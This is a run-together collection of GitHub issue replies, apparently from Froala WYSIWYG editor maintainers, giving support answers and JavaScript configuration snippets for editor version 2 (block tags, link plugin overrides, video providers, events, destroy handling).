the height to work correctly.\n. It appears there is a documentation problem. Actually the 2nd param specifies if the HTML is clean or not.\n. Here you go: http://jsfiddle.net/froala/s49f06mu/1/. You should use the events.on method for that and get it run before the other internal events by passing the 3rd param as true.\n. Today we put an update here on Github which also clears these events automatically on destroy. If you are using an older version, what you should do is to call $textarea.off('froalaEditor');. This will clear all the events having the froalaEditor namespace.\n. That is right.\n. @philfreo yes, this is the way it was intended. return false only prevents that event from being triggered inside the editor. To prevent bubbling up, you should use e.stopPropagation().\n. When the display of the image is Inline block, then the center option of the alignment inherits the property of the parent. Changing that to Break text will display it centered. \nRegarding the useClasses: false, indeed it appears that is not working correctly when the editor is initialized on image.\n. It is fixed in the latest 2.6.0 version.. @escopecz you should also make sure you remove the style tag from htmlRemoveTags.\n. It would be great if you could provide more details because this cannot be reproduced on our website.\n. @HusseinElMotayam I just checked this and I can confirm that there is a problem when you put a comment inside the head tag, but it works fine in thebody one. \n. V2.3.5.\n. Would it be possible to create a recording?\n. @twalia could you please make a recording?\n. @vahtel We did some research on this matter and, unfortunately, it is not possible to detect if a dropped file is file or folder.\n. http://stackoverflow.com/a/25095250/1806855\n. Indeed, it appears there there might be some workarounds lately. However, we had a quick discussion about this and, for UX, we believe that there should be an error message shown instead of not doing nothing.\n. We have in plan to create custom messages for each error. This will roll out in few months.\n. On destroy all the events attached to the editor instance are being destroyed. That is the correct behaviour which was introduced by https://github.com/froala/wysiwyg-editor/commit/ca300f606500444b244361e85591e58f61e083ea.\n. @axelduch Would it be possible to make a recording of this? Thank you.\n. I am closing this due to lack of response and because we cannot reproduce it. If you could make a recording we would be happy to look into it.\n. @philfreo that is the iframeStyle option which is set by default by the editor. It makes sense to have an option there that would mention what kind of attributes someone wants to be ignored in the outputted style. I marked this as enhancement.\nThe classes are kept so that they can be used when the content is being added back in the editor to edit it again. Not all the inline style can be converted back to classes while the other way is possible all the time. Since you're sending emails, if you don't have an autosave feature then it would make sense to use a regex on the output to remove all the fr- classes. \n. Last commit (341e28c091d995519b134e4eea8bce87c208645c) is adding the htmlIgnoreCSSProperties option. You can use it to tell the editor what CSS properties you want to ignore in the conversion from CSS styles to inline styles. E.g.:\njs\nhtmlIgnoreCSSProperties: ['font-family', 'font-size']\n. Would it be possible to send us an example where this is happening?\n. Indeed, that works as well. However, the problem with it is that you cannot use it with buckets that are Non\u2013DNS-Compliant. Please see more there: http://docs.aws.amazon.com/AmazonS3/latest/dev/BucketRestrictions.html#non-dns-compliant-bucketname-challenges.\n. @philfreo that is right. We'll see what we can do.\n. With the last commit you can pass the upload url for S3, by adding the uploadURL property to imageUploadToS3 object. \n. That is right.\n. Right.\n. It appears you're not including the draggable plugin which handles that event.\n. @philfreo Please see: http://jsfiddle.net/froala/ab24frkd/1/.\n. toolbarButtons option contains the entire list of buttons available directly in the toolbar.\n. Hi @jpgilchrist! We just checked this and it seems that we cannot reproduce it. We tried both the jsFiddle and our website. . Could you please make a jsFiddle? Thank you.\n. I'm closing this due to lack of response. You should make sure that you allow them in the htmlAllowedTags and htmlAllowedEmptyTags.\n. @DevAlien thank you. We answered by email.\n. I am closing this because it will be implemented as feature which adds the possibility to keep advanced formatting on paste.\n. @maverick42 @pelizza @ingpdw please make sure you are using the latest 2.6.0 version.. @mkerkeni we would be happy to look into if you can send us the document you're pasting from. Thanks in advance.. @SwapnilMane are you facing this on our website as well?. @SwapnilMane are you getting the Word Paste modal?. @adamgins I believe there might be a conflict with FastClick which prevents the editor to work correctly. Are you able to replicate that on our website. On our website, the entire inline demo section is made this way and it works without problems.\n. I don't know how FastClick works and what exactly it blocks there.\n. No, that is not enough because the editor is using the document clicks as well. If fast click is blocking the events there then that is no good. All editor elements are designed to start with fr-. If you could get it ignore all those, then you might have a chance to have it working.\n. @adamgins unfortunately, we're not familiar with how FastClick is designed in order to provide enough details on this matter.\n. @dave-buzzy your workaround if fine, what you could do better is to use the editor.$el instead of .find(...). That has been fixed on the current master about 2 weeks ago.\n. It's fixed on the current master.\n. In case you believe it doesn't work with the master version, please make a jsFiddle. Thank you.\nPlease make sure you update all the editor JS files.\n. That is using the version 2.3.4. The current master branch is V2.3.5 which is under development.\n. You can download it from here at anytime. https://github.com/froala/wysiwyg-editor/archive/master.zip\n. I believe that you're not updating it correctly.. Please see: https://jsfiddle.net/rLuehasx/7/\n. Could you please make a recording? It works at my end.\n. It appears that is not working for pasted links, not for the ones when you type.\n. You could use undo.saveStep which is forcing the sync in case there are any changes.\n. Are you able to reproduce this on our website?\n. I believe this is an issue that was there in an older version. Please upgrade to the latest one: 2.3.4.\n. Is that happening on our website as well https://www.froala.com/wysiwyg-editor/docs/examples/predefined-height?\n.  The option should be set via the height editor option, not using CSS.\n. Having the cursor set correctly depends on the height option. You can always set the height option after initializing the editor this way:\njs\n$(selector).data('froala.editor').opts.height = new_height;\n$(selector).data('froala.editor').size.refresh();\n. @sandeepsukhija @MartinHlavna please make a jsFiddle. Thank you.\n. @MartinHlavna on a closer look, it appears the problem is not coming from the editor, but from some CSS that you added there which breaks the way heights are computed. Here is a fix for it: https://jsfiddle.net/uh6ma9cf/3/.\n. Sure, you can add it here:\nhttps://github.com/froala/wysiwyg-editor/blob/master/html/file_s3_upload.php#L18\nhttps://github.com/froala/wysiwyg-editor/blob/master/html/file_s3_upload.php#L167 (params are set as headers)\n. Are you testing using the Github master? This issue was fixed few days ago. https://github.com/froala/wysiwyg-editor/issues/1455\n. There is no built-in way for this. I put this on our list and if there is more interest for it, then we'll see if it makes sense to implement it. In the meanwhile, I would recommend you to create a custom dropdown for it: https://www.froala.com/wysiwyg-editor/docs/examples/custom-dropdown\n. New lines are converted to paragraphs. I just tested on the file you sent us and that is the way it is supposed to work.\n. It is not possible to upload multiple images at the same time for the moment. This feature is on our list and it will be implemented over the following months.\n. Could you please make a jsFiddle?\n. I am closing this due to lack of response. We would be happy to look over it as soon as we get enough details to reproduce it.\n. I marked this as a feature-request because not all of the users would want this.\n. Are you experiencing that on our website?\n. It should be fixed now. Could you please try again? \n. We're working on a solution for allowing this.\n. Please see: https://github.com/froala/wysiwyg-editor/tree/master/html/require_js.\n. @for2B the links changed in the meanwhile: https://github.com/froala/wysiwyg-editor/tree/master/html/3rd-party/require_js.. It has been fixed on the master branch few days ago.\n. Could you please make a jsFiddle?\n. @Vaultman the problem appears to come from your height: 100% property set in the external CSS for body and height.\n. Do you have any editor instance that was not destroyed, but it was removed from the DOM?\n. @cfey would it be possible to make a jsFiddle? Thanks.\n. Please make sure you have your attributes added in htmlAllowedAttrs option.\n. @edelciomolina if you could provide a jsFiddle, we would be happy to assist with it.. Could you please send us a document to copy from?\n. @mrjlynch \"Preview\", that's the magic word that you added later on. \ud83d\ude03 \n. The editor is using the fr-original-style and fr-original-class to revert back the style that was there before converting the CSS to inline style. What I would recommend if you want not to have those in the output is to use a RegEx to remove these 2 attributes from the outputted HTML when you send the email.\n. By default, the images inside the editor have the property max-width: auto. If you want to keep that ration, then add the following css code:\ncss\n.fr-view img {\n  height: auto !important;\n}\n. This is fixed on the master version. Please make sure you're using V2.3.4.\n. We consider this as being a wontfix because browsers do not permit to change the color of the bullet only without the rest of the text inside the LI element.\n. @cricci I understood it correctly. However, it's not possible to change the color of those bullets because the browser do not allow to change the color of the bullet only in lists.\n. @carolynmills yes, it is the same for font size of numbers for OL.. @nico-onmap that would introduce some problems when changing the style afterward for parts of the list. We're working on some improvements here.. We do not consider this an issue. The editor is designed to clean those spans that have no attributes. \n. It is on our plan to remove the jQuery dependency, however that is unlikely to happen in V2.\n. We're working on it and you can see progress here: https://wysiwyg-editor-roadmap.froala.com/public/ideas/3597.. This is expected because when pasting from Google Docs, the font weight comes as inline style, while when you paste from TextEdit it comes as a b tag. \n. This should be fixed on Github master. Could you please give it a try?\n. Unfortunately, it is not possible to change that option after the editor has been initialized.\n. Would it be possible to create a jsFiddle?\n. For the moment this feature is not available. If you want you could group images by tags and us tags just like folders.\n. @sbosell an improved Image Manager is on it's way. . No, we're working on a solution for this. Unfortunately, I don't have an ETA to share with you for this.\n. @StefanNeuser we do not use this repo for feature-requests, but for bug tracking. . You could add the div.clear.fix tag to the htmlAllowedEmptyTags option if you want to avoid that.\n. The DIV tag has been designed to be a block tag and block tags should have BR tags inside in order to be editable. If you want to change this behaviour you could add the following line before initializing the editor, but you should be aware that this might cause unexpected editing behaviours.\njs\n$.FE.BLOCK_TAGS = ['address', 'article', 'aside', 'audio', 'blockquote', 'canvas', 'dd', 'dl', 'dt', 'fieldset', 'figcaption', 'figure', 'footer', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header', 'hgroup', 'hr', 'li', 'main', 'nav', 'noscript', 'ol', 'output', 'p', 'pre', 'section', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead', 'tr', 'ul', 'video'];\n. Are you using the Github master? Could you also please make a recording for it?\n. Could you please make a recording?\n. @SCCarl you can upload it somewhere (Youtube / Dropbox) and send a link from there as well. We just tried it again with different setups and we couldn't replicate this problem with the master version. Please make sure you're using the master version. I am closing this until we get more details.\n. Could you please send a text that includes thin space? When you use option + space it doesn't insert thin space either (I tried in Pages). \n. Closing this due to lack of response.. If you want to keep the image width attribute in the output, then you should use the https://froala.com/wysiwyg-editor/docs/options#imageOutputSize option.\n. @kmacampbell @ravitejabommakanti unfortunately, this is a limitation because of the way V2 was designed and cannot be achieved in the current version. For now we'll leave it as a wontfix.. @SimonLuckenuik it is going to be implemented eventually, however I cannot provide an ETA.. I am closing this and marking as a feature-request as it is not possible to implement it in V2, but will be addressed in the next version.. There is no such feature built-in the editor for that. What you could do is to register to the popups.show event and mark it that way the popup is shown. Here is some code that \njs\n  $('selector').on('froalaEditor.initialized', function (e, editor) {\n    editor.popups.onShow('link.insert', function () {\n      var $popup = editor.popups.get('link.insert');\n      console.log ($popup);\n      $popup.find('input[type=\"checkbox\"]').prop('checked', true);\n    });\n  }).froalaEditor();\n. We just tested this and there doesn't appear to be any difference. Are you using the latest angular plugin version (v2.3.4) or only the editor V2.3.4? Could you provide a demo?\n. @bpetersenmw are you having the Developer Tools enabled? We are noticing a considerable performance drop-off with the DT enabled.. You can check if the editor has focus before adding the markers like this: https://jsfiddle.net/9deh2f09/. The selection.save method is not designed to check if the editor has focus, it can be used on other editable elements as well.\n. @RuslanZavacky please make a jsFiddle. Thank you. Browsers work different and handle selection differently. \n. Unfortunately, it is not possible to do that in Firefox and is browser specific. That is because the blur event is being triggered after the editor has already lost the selection and you cannot save it any longer. What you could do is to put there a mousedown event for other elements on the page and store selection there if the selection is inside editor.\n. By default the tab is designed to make the editor loose focus, not add indentation. If you enable the tabSpaces option then you'll get indentation.\n. We consider the current behavior as being the correct one, the list item should be removed when it's the first one, not unindented.\n. We're implementing it the way we consider as being correct, not how Word works. When you are at the beginning of list and hit backspace, it will get out of the bullet list. That should happen here as well.\n. Unfortunately, the icons from Font Awesome don't look great for this and that's why we used a SVG. Indeed, it makes sense to have defined the same way because they are an icon.\n. The way described here can be used for this: https://github.com/froala/wysiwyg-editor/issues/1235#issuecomment-251943999.\n. That can easily be done by returning false in the callback of the drop event.\n. https://github.com/froala/wysiwyg-editor/blob/master/html/events/drop.html#L78. That is because on image drop, the editor is designed to upload it inside the image plugin. If you want to prevent that, then you could listen to the event a bit different:\n```js\n  $(selector).on('froalaEditor.initialized', function(e, editor) {\n    editor.events.on('drop', function (dropE) {\n        // Does print.\n      console.log('drop')\n  // Prevent default behavior.\n  return false;\n}, true)\n\n})\n  .froalaEditor()\n``. Unfortunately, this will remains as awontfix. IE has a very strange way of handling selection next to image.\n. @JordanAtIgloo we tried with _placeCursor and in our tests it is not doing any difference.\n. Could you please let us know what keys are you pressing on a qwerty keyboard? Also, are you able to reproduce it on our website?\n. We just tested this and it is not happening with the Github master. @largeden do you think you could provide some insights?\n. I am closing this because we cannot reproduce the problem. @open2 if you could get back to us with enough details to reproduce it, then we'll open it again and fix it.\n. Please see: https://github.com/froala/wysiwyg-editor/issues/482#issuecomment-83714915. Entities should be escaped before adding in textarea.\n. There is no built-in feature for that, but you can easily achieve it by creating a [custom dropdown](https://froala.com/wysiwyg-editor/docs/concepts/custom/dropdown) and using thehtml.set` method.\n. The problem comes because of the way the selection is placed by the browser inside the link elements in this case. Here is what you can do to overcome this problem.\n``` js\n$(editor_selector).on('froalaEditor.initialized', function (e, editor) {\n        // Mouse down on link.\n        editor.events.$on(editor.$el, editor._mousedown, 'YOUR_BTN_SELECTOR', function () {\n          var range = editor.doc.createRange();\n          range.selectNodeContents(this);\n      if ($(this).text().length == 0) {\n        $(this).prepend($.FE.INVISIBLE_SPACE);\n      }\n\n      var sel = editor.win.getSelection();\n      sel.removeAllRanges();\n      sel.addRange(range);\n    })\n\n    // Mouseup on link.\n    editor.events.$on(editor.$el, editor._mouseup, 'YOUR_BTN_SELECTOR', function (e) {\n      e.preventDefault();\n    });\n\n});\n```\n. We're using it for a similar case and works fine just this way. Could you please make a jsFiddle? Thank you.\n\nOn 11 Oct 2016, at 23:21, Nick DiMatteo notifications@github.com wrote:\nHmm,\nThis isn't working at all.

Because of the way the browser contenteditable selection works when you have a svg inside a link and navigate using the arrows, the cursor would jump over that tag. Unfortunately, we don't have a workaround for this.\n. Hi @ndimatteo, have you followed my last comment? https://github.com/froala/wysiwyg-editor/issues/1552#issuecomment-253158819\n. @ndimatteo if you could update the codepen it would be great. Thank you.\n. @ndimatteo please try this: http://codepen.io/anon/pen/dpxjER.\n. Section is by default a block and when HTML is insert in a block, the editor splits it. What you could do to avoid that is to add the following code before initializing the editor which removes section as a block tag.\n$.FroalaEditor.BLOCK_TAGS = ['address', 'article', 'aside', 'audio', 'blockquote', 'canvas', 'dd', 'div', 'dl', 'dt', 'fieldset', 'figcaption', 'figure', 'footer', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header', 'hgroup', 'hr', 'li', 'main', 'nav', 'noscript', 'ol', 'output', 'p', 'pre', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead', 'tr', 'ul', 'video'];\n. @M-Knobloch we answered to your questions via email in the same day. Please make sure you're receiving our responses via email. Also, please check the spam/junk folder because responses might end there sometimes.\n. @SeanKendle please add class fr-inner to those divs that you don't want to split.. @SeanKendle it is not possible to allow P tags within DIV elements at this moment.. There is only one more class which could be used fr-deletable which could be used to mark an entire inline node as being deletable on backspace.. Could you please let us know the exact steps to reproduce this? Thank you.\n. It's already fixed on master: https://jsfiddle.net/en22td16/24/.\n. Duplicate of #1554 \n. We consider this as a feature-request and we keep here only bugs and enhancements. It is already on our TODO list.\n. Could you please send over to us the document you're copying from? Thank you.\n. There is going to be an update for all Office pasting over the following weeks. We are working on an improved pasting from Office.. The RegisterCommand method is detailed in our docs: https://www.froala.com/wysiwyg-editor/docs/concepts/custom/button. The unmnified JS is available under the Advanced and OEM licenses.\n. @dankantor the toolbar.showInline method does just that: https://www.froala.com/wysiwyg-editor/docs/methods#toolbar.showInline.. @connect-technologies please try again with the latest commit. Thanks for testing it.\n. The editor output is HTML5, not XML valid. In HTML5, self closing tags do not have to be closed. If you want to close them, you could use the html.get event and add that closing tag using a regex.\n. The image manager plugin is not making requests to load a new page, it is expecting to get the full list with the path to the images and when you scroll it will make requests to load the additional images. That is because the overload is not when you get the JSON with the images list, but when you load each image in the modal to display it.\n. This is fixed in V2.3.5.\n. Last commit makes it as default behavior.\n. @maverick42 it should be fixed on the Github master.\n. You should implement image upload on server side and return a JSON with the path to the uploaded image.\n. Editor V2 support IE10+.\n. It is already on our TODO list as an enhancement and it will be updated shortly.\n. We consider it an enhancement because the browser returns the selection as being from side to side when using clientBoundingRect for the selection object: https://developer.mozilla.org/en/docs/Web/API/Element/getBoundingClientRect.\n. Unfortunately, this will remain as a wontfix. We are using getBoundingClientRect method (https://developer.mozilla.org/en/docs/Web/API/Element/getBoundingClientRect) which it appears is returning a wrong attribute. We'll investigate further what is causing that in browsers and report this to Chrome/Mozilla.\n. Unfortunately, that is not something will add because all events are unbinded on destroy.\n. The editor should unbind on destroy all the events that are attached to it. That means everything from froalaEditor namespace. On destroy things are done synchronously, therefore the instance is destroyed as soon as the destroy method has finished to run.\n. That is right, there is a difference in how we vs you believe this should work. \ud83d\ude04 However, we might have a workaround for you (there is always one).\n``` js\n$.FroalaEditor.prototype.destroy = function () {\n    this.shared.count--;\nthis.events.$off();\n\n// HTML.\nvar html = this.html.get();\n\nthis.events.trigger('destroy', [], true);\nthis.events.trigger('shared.destroy', undefined, true);\n\n// Remove shared.\nif (this.shared.count === 0) {\n  for (var k in this.shared) {\n    if (this.shared.hasOwnProperty(k)) {\n      this.shared[k] == null;\n      $.FE.SHARED[this.sid][k] = null;\n    }\n  }\n\n  $.FE.SHARED[this.sid] = {};\n}\n\nthis.$oel.parents('form').off('.' + this.id);\nthis.$oel.off('click.popup');\nthis.$oel.removeData('froala.editor');\n\n// this.$oel.off('froalaEditor');\n\n// Destroy editor basic elements.\nthis.core.destroy(html);\n\n$.FE.INSTANCES.splice($.FE.INSTANCES.indexOf(this), 1);\n\n}\n``\n. No, images that are being pasted with links are not uploaded. If you want to upload such images, you could use thepaste.afterevent and do that.\n. @themoor88 could you please send us what you're pasting in code view?\n. When you embed this in the editor, the script from Twitter is changing the blockquote into their own HTML structure. That structure is then removed by the editor in code view because those are not allowed HTML tags (see htmlAllowedTags and htmlAllowedAttrs). Instead of doing that you should embed only the Twitter blockquote and then when you display the HTML add the script from Twitter on your page.\n. The optionpluginsEnabledcan be used for that.\n. @starikovs pass the other plugins except the quick insert one..html.setis not designed to trigger the contentChanged event. If you want to have contentChanged triggered you should callundo.saveStepafterhtml.set.\n. @somazx could you please confirm you're using the V2.3.5?\n. @somazx if you could create a jsFiddle to reproduce it, then we would be happy to look into this.. The editor is testing the embedded code using a regular expression:/^\\W((<\\/iframe>)|())\\W$/i`. If you want to allow other things such as P tags, then you should change it by adding the following line before initializing the editor.\njs\n$.FroalaEditor.VIDEO_EMBED_REGEX = your_reg_ex_here;\n. That's because you're not including the Image plugin.\n. What you can do is to use the image.uploaded event, parse the response and insert the image using the image.insert method.\n. We do not accept PR directly here. If you have any code suggestions, please send them over to us using the support form.\n. Using events.on, you get only the parameters starting with the 3rd one. That's because events.on is designed more for internal usage where you already have an instance of the editor and the first param is e which you get using the other way is jQuery specific.\n. No, it is not available because that can be implemented easily, by using the popups.onShow('link.insert', function () { ... } event.\n. Here is how you can change it without having an event.\n``` js\nvar original_link = $.FE.PLUGINS.link; \n$.FE.PLUGINS.link = function (editor) { \n  var link = original_link(editor); \nvar insert = link.insert;  \n// This is the original sanitizer.\n  link.insert = function (href, text, attrs) {\n      // Make any changes you want.\n  // Call the original insert.\n  insert(href, text, attrs);\n\n}; \nreturn link;\n} \n``\n. The Twitter embed contains` tag which by default the editor doesn't allow.\n. Are you able to reproduce this on our website?\n. Closing this due to lack of response.. I initially marked this as a bug, however it is not really the case. There might be users who just want to put there a link only with attributes. However, you could override easily the default behavior this way:</p>\n<p>``` js\nvar original_link = $.FE.FroalaEditor.link; \n$.FroalaEditor.PLUGINS.link = function (editor) { \n  var link = original_link(editor); </p>\n<p>var insert = link.insert;  </p>\n<p>// This is the original sanitizer.\n  link.insert = function (href, text, attrs) {\n      // Make any changes you want.\n      if (!href.length &amp;&amp; !text.length) return false;</p>\n<pre><code>  // Call the original insert.\n  insert(href, text, attrs);\n</code></pre>\n<p>}; </p>\n<p>return link;\n} \n<code>``\n. @davidtorroija recently we added a new event</code>link.beforeInsert<code>which could be used: https://www.froala.com/wysiwyg-editor/docs/events#link.beforeInsert.. Thanks for the suggestion. I am closing this because it doesn't appear to be an editor issue, but rather a new feature.\n. The language option cannot be changed after the editor was initialized. To change the language you should destroy the instance and initialize it again.\n. The table tool is designed not to appear on mobile devices mainly because of the fact that multiple cells cannot be selected and that the space there is very limited.\n. This should be fixed on master.. Sure, you can initialize the editor on any HTML. If you want to have HTML displayed in the editor, then you should pass the HTML sanitized. E.g.</code><b>bold</b><code>should be</code>&lt;b&gt;bold&lt;/b&gt;<code>.\n. Are you able to reproduce it on our website? https://www.froala.com/wysiwyg-editor/inline. Could you please let us know the exact steps to reproduce it? Letting us know step by step what keys you press on the QWERTY keyboard would be very helpful. Thank you.. It should be fixed on master now.. It appears you're using V1 that we're no longer maintaining. Please upgrade to V2.\n. The editor is allowing inside the main editable area direct tags only the ones from</code>$.FroalaEditor.BLOCK_TAGS<code>variable. By default</code>SPAN<code>is not there and when you have the</code>enter<code>option set to</code>$.FroalaEditor.ENTER_P<code>it would wrap the span with a</code>P<code>tag and that is why you get that behavior.\n. @maverick42 we cannot reproduce this. Could you please make a jsFiddle? Thank you.. You cannot use the jQuery UI Sortable on the element on which you're using the editor because both rely on the mouse clicks and they are not compatible. As an alternative, you could use a handler in jQuery UI and use that handler to sort the elements.. It is not happening in V2.3.5. Could you please make sure you're using the latest version? If so, then please make a jsFiddle.. Closing this due to lack of response.. We were able to reproduce it only sporadically and when developer tools was opened and in Compatibility View with IE 10. If you could find a way to reproduce this all the time, we would be happy to look further into it.. @JordanAtIgloo thanks for the additional details. We'll try to figure it out.. Unfortunately we cannot find a way to reproduce this. It might be related to #1694, but we couldn't reproduce that either.. The code view is designed to be updated only when you toggle the code view button. If you are doing changes in the text view while you're in code view, those changes won't reflect there.. Fixed in 498f1dc923cdafbcb2b525811a92f83fced845e4. @chrisdeeming we consider this as correct behavior and the placeholder was designed to work that way. Same happens if you select H1 or H2 for instance.. We couldn't reproduce this. Are you using v.2.3.5?. @chrisdeeming yes, we did just this in IE11 and tested on both Windows 10 and Windows 7. Could you make a jsFiddle for it?. @aberamgd are you able to reproduce this on our website? Thank you.. Closing this due to lack of response.. If it works on our website, then most likely there is a problem from your configuration. Please make a jsFiddle so that we can help you.. That is happening because you are setting the scrollable container as the body of the main page, while you're doing scroll inside the iframe.. @andyharjanto2 could you please send us a link to a page where we can reproduce it? A jsFiddle would be great. Thank you.\n. This is no longer a problem in V2.3.5. Please upgrade to it.. Are you pressing anything on the keyboard after hitting the Bold button?. Same with: https://github.com/froala/wysiwyg-editor/issues/1572#issuecomment-259158876. . What OS and Browser are you using? On MacOS, any browser they look just fine.. Are you doing anything while the image is being uploaded?. We keep on this repo only issues, not feature-requests. I marked this as a</code>feature-request<code>and added it to our list.. @aarndt we don't have a public roadmap available.. Please see: https://github.com/froala/wysiwyg-editor/issues/205#issuecomment-56945267. It appears that you should tell jquery drag not to target the editor elements. All editor elements start with the</code>fr-<code>class so you could use something like</code>[class*=' fr-']<code>.. It's unlikely to have such a feature added in the editor. I would recommend you instead to write a wrapper over the insertEmbed and insertByURL methods in order to find out how a video was inserted.. It is fixed on the master branch.. Inside the callback you can just call the methods this way:</code>this.paragraphFormat.apply('H2')`.</p>\n<p>As for refreshing the button, you would have to use the refresh callback and set the state. You can use something like this:\n```js\n      refresh: function ($btn) {\n        var blocks = editor.selection.blocks();\n        var blk = null;\n        if (blocks.length) {\n          var blk = blocks[0];\n        }</p>\n<pre><code>    $btn.toggleClass('fr-active', blk &amp;&amp; blk.tagName == 'H2');\n  }\n</code></pre>\n<p><code>. @jchautreux how are you inserting the image? Is that reproducible on our website as well?. Thanks for the feature suggestion. . We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @strokirk Please use the `class='fr-inner'`. See: https://jsfiddle.net/11csLex6/4/.. @xanka are you experiencing that on our website as well? https://www.froala.com/wysiwyg-editor/inline. If you cannot reproduce it on our website, then it is very likely to be something related to your implementation. Please make a jsFiddle for it.. Are you experiencing it on our website?. @SiddiquiImran We just tried to reproduce this without success. Please make a jsFiddle.. Closing this due to lack of response.. @SiddiquiImran are you experiencing that on our website? Could you please make a recording?. @SiddiquiImran thanks for the additional details. We just fixed it in a previous commit. It was the same with #1653.. @DenisaSurdu what PDF viewer are you using?. Could you please make a recording? Thank you.. This is already fixed on the current master.. Unfortunately, this is a limitation of the browser `contenteditable` feature.. I was testing in Chrome and in Chrome in native content editable drag isn't working. I am reopening this and we'll check it once over again.. @chrisdeeming they might be added it in beta. we'll check. . Please open this issue on the Angular 2 plugin for the editor: https://github.com/froala/angular2-froala-wysiwyg.. @tomalex0 at this moment we're working on a new feature that would allow to embed rich content such as Twitter or Facebook posts, however I don't have an ETA at this moment for it.. @tomalex0 @traber333 @selfagency It is possible starting with version 2.7.0. See https://www.froala.com/blog/wysiwyg-editor/most-wanted-froala-editor-release.. @FinesseRus the editor is making use of simple spaces and non-breaking spaces in order to provide a true WYSIWYG experience. For example when you hit a regular space, the browser by defaults inserts multiple spaces which are collapsed and the user doesn't see nothing. We have in place some custom code which combines the simple spaces with non breaking ones so that the users can actually see what they type. Unfortunately, this makes non breaking characters unusable when using ALT+space or ALT+0160. We're constantly looking for better approaches and if we find one, then it would definitely be implemented.. In the current version, we're leaving this as a `wontfix` because there are some things in the core which rely on that. This issue will be addressed in further major editor versions.. @jipigi thanks for your input regarding this matter. We have some custom actions there for space and custom rules for placing non-breaking spaces. If we'd leave the browser to put in just simple spaces without non-breaking ones, then we might end in a lot of scenarios where you type multiple spaces and you actually see only one which is not correct. We had such a behavior in version 1 and we redesigned it like so in version 2. Maybe it is not the best way, however, with the way contenteditable works at this point is the approach with works in fairly most of the cases.. Unfortunately, in the version 2 that won't be possible. We have all the core designed based on the way non-breaking spaces currently works.. Most probably there is something wrong with the response from the server. For tech support please contact us via our website.. @palich12 are you experiencing that on our website?. You are using an older version of jQuery (1.9.1). The editor requires jQuery at least 1.11.0.. @FletcherPink that is right. The last commit fixes it.. @palich12 please update tot the Github master.. Unfortunately because of some browser limitations it is not possible to place cursor between the images. For that we just made the editor to insert a new line just above the image when you have the image selected and hit enter.. @JSteunou @jwhitmarsh For now the editor needs jQuery. It is on our plan to remove the jQuery dependency over the next period. For now for importing with webpack, please use the plugin provider as they describe in their docs: https://webpack.github.io/docs/shimming-modules.html#plugin-provideplugin</code>\nnew webpack.ProvidePlugin({\n    $: \"jquery\",\n    jQuery: \"jquery\",\n    \"window.jQuery\": \"jquery\"\n})\n```</p>\n<p>An example for es6 will come shortly.. That global usage of jQuery inside the code has been fixed and isn't there anymore in v2.4.1.. @Panman8201 please see: https://github.com/froala/wysiwyg-editor/issues/447#issuecomment-219739929.. @JSteunou it's updated on npm now as.. That is because you are not setting the <code>scrollableContainer</code> option: https://jsfiddle.net/bysp4rxv/.. This doesn't look like an editor problem, but rather an implementation issue. We offer tech support via our website for users who have a license that includes support. Please reach us through there: https://www.froala.com/wysiwyg-editor/contact.. Are you able to reproduce it on our website?. @FletcherPink what options are you initializing the editor with?. The editor supports by default Youtube, Vimeo, Dailymotion, Yahoo and Rutube. If you want to add a new video provider, then you should change the following object:</p>\n<p><code>js\n$.FE.VIDEO_PROVIDERS = [\n    {\n      test_regex: /^.*((youtu.be)|(youtube.com))\\/((v\\/)|(\\/u\\/\\w\\/)|(embed\\/)|(watch\\?))?\\??v?=?([^#\\&amp;\\?]*).*/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:m\\.)?(?:youtube\\.com|youtu\\.be)\\/(?:watch\\?v=|embed\\/)?([0-9a-zA-Z_\\-]+)(.+)?/g,\n      url_text: '//www.youtube.com/embed/$1',\n      html: '&lt;iframe width=\"640\" height=\"360\" src=\"{url}?wmode=opaque\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;'\n    },\n    {\n      test_regex: /^.*(vimeo\\.com\\/)((channels\\/[A-z]+\\/)|(groups\\/[A-z]+\\/videos\\/))?([0-9]+)/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:vimeo\\.com)\\/(?:channels\\/[A-z]+\\/|groups\\/[A-z]+\\/videos\\/)?(.+)/g,\n      url_text: '//player.vimeo.com/video/$1',\n      html: '&lt;iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;'\n    },\n    {\n      test_regex: /^.+(dailymotion.com|dai.ly)\\/(video|hub)?\\/?([^_]+)[^#]*(#video=([^_&amp;]+))?/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:dailymotion\\.com|dai\\.ly)\\/(?:video|hub)?\\/?(.+)/g,\n      url_text: '//www.dailymotion.com/embed/video/$1',\n      html: '&lt;iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen&gt;&lt;/iframe&gt;'\n    },\n    {\n      test_regex: /^.+(screen.yahoo.com)\\/[^_&amp;]+/,\n      url_regex: '',\n      url_text: '',\n      html: '&lt;iframe width=\"640\" height=\"360\" src=\"{url}?format=embed\" frameborder=\"0\" allowfullscreen=\"true\" mozallowfullscreen=\"true\" webkitallowfullscreen=\"true\" allowtransparency=\"true\"&gt;&lt;/iframe&gt;'\n    },\n    {\n      test_regex: /^.+(rutube.ru)\\/[^_&amp;]+/,\n      url_regex: /(?:https?:\\/\\/)?(?:www\\.)?(?:rutube\\.ru)\\/(?:video)?\\/?(.+)/g,\n      url_text: '//rutube.ru/play/embed/$1',\n      html: '&lt;iframe width=\"640\" height=\"360\" src=\"{url}\" frameborder=\"0\" allowfullscreen=\"true\" mozallowfullscreen=\"true\" webkitallowfullscreen=\"true\" allowtransparency=\"true\"&gt;&lt;/iframe&gt;'\n    }\n  ];</code>. Doesn't seem to happen on MacOS and Windows. We'll check it on Ubuntu to see if we can reproduce it there.. You could do something like this:\n```\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.popups.onShow('image.insert', function () {\n    var $popup = editor.popups.get('image.insert');</p>\n<pre><code>// Replace the text here.\n</code></pre>\n<p>})\n});. This is a bug from browsers. We just reported them over to Chrome, Mozilla and Safari in 